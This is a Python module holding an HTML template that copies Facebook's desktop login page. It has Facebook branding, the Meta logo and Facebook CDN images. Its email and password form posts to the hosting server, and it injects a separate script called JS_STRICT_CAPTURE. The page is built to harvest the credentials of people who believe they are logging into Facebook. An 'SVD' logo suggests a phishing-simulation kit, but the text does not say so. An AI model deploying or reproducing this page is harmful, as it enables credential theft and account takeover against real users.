"""html_pc.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_PC = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="/static/svd_logo.svg" type="image/svg+xml">
    <title>Facebook - Log In or Sign Up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .login-card { background: #fff; padding: 20px 16px 28px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 396px; }
        .pc-input { border: 1px solid #dddfe2; border-radius: 6px; padding: 14px 16px; width: 100%; font-size: 17px; outline: none; }
        .pc-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .pc-btn { background-color: #0866FF; color: #fff; border-radius: 6px; padding: 10px; font-weight: bold; font-size: 20px; width: 100%; border: none; cursor: pointer; transition: background 0.2s; }
        .pc-btn:hover { background-color: #0056D6; }
        .create-btn-pc { background-color: white; color: #0866FF; border-radius: 6px; padding: 0 16px; font-weight: bold; font-size: 17px; height: 48px; border: 1px solid #0866FF; cursor: pointer; width: 100%; margin-top: 20px; }
        .create-btn-pc:hover { background-color: #f2f2f2; }
        .meta-logo-svg { width: 180px; height: auto; }
        .svd-logo { height: 30px; width: auto; vertical-align: middle; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="p-8 flex items-center gap-3">
        <svg class="meta-logo-svg" viewBox="0 0 500 100">
            <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
        </svg>
        <img src="/static/svd_logo.svg" alt="SVD" class="svd-logo">
    </div>
    <div class="flex-grow flex items-center justify-center -mt-12">
        <div class="flex flex-row items-center justify-between w-full max-w-6xl px-4">
            <div class="w-1/2 flex flex-col space-y-8 pr-12">
                <div class="relative w-[520px] h-[380px]">
                    <img draggable="false" id="dynamic-img" src="https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp" class="w-full h-full object-contain">
                </div>
                <h1 class="text-4xl font-semibold text-gray-900 leading-tight">
                    Explore topics that <span class="text-blue-600">you love.</span>
                </h1>
            </div>
            <div class="flex flex-col items-center">
                <div class="login-card">
                    <h2 class="text-xl font-bold mb-6 text-gray-900">{{ login_title }}</h2>
                    <div id="error-box-pc" class="{% if not message %}hidden{% endif %} w-full bg-[#FFEBE8] border border-[#DD3C10] text-[#333333] p-3 rounded-sm text-[13px] mb-4 leading-tight flex items-start text-left">
                        <i class="fas fa-exclamation-triangle text-[#DD3C10] mt-0.5 mr-2"></i>
                        <span>{{ message }}</span>
                    </div>
                    <form method="POST" class="space-y-4" onsubmit="return validateLogin('email-pc')">
                        <input type="hidden" name="action" value="login">
                        <input type="text" name="email" id="email-pc" placeholder="{{ email_ph }}" class="pc-input {% if message %}border-red-500{% endif %}" required>
                        <input type="password" name="pass" placeholder="{{ pass_ph }}" class="pc-input {% if message %}border-red-500{% endif %}" required>
                        <button type="submit" class="pc-btn">{{ login_btn }}</button>
                    </form>
                    <div class="mt-4 text-center">
                        <a href="#" class="text-black font-semibold text-sm hover:underline">{{ forgot }}</a>
                    </div>
                    <div class="border-t border-gray-200 mt-6 pt-2">
                        <button type="button" class="create-btn-pc">{{ create }}</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
    function validateLogin(id){ return true; }
    </script>
</body>
</html>
"""
